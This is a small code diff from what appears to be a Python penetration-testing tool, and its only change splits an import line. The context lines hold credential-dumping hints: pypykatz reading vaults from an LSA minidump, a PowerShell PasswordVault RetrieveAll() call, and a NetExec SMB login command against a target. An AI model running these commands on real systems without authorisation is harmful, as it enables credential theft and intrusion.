@@ -25,7 +25,8 @@ def run(args: Any) -> int:
     print("  2. pypykatz: pypykatz lsa minidump <dump> --vaults")
     print("  3. PowerShell: [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials]::new().RetrieveAll()")
 
-    import subprocess, shutil
+    import subprocess
+    import shutil
     nxc = shutil.which("nxc") or shutil.which("netexec")
     if nxc and target:
         cmd = [nxc, "smb", target, "-u", cred.username or "",
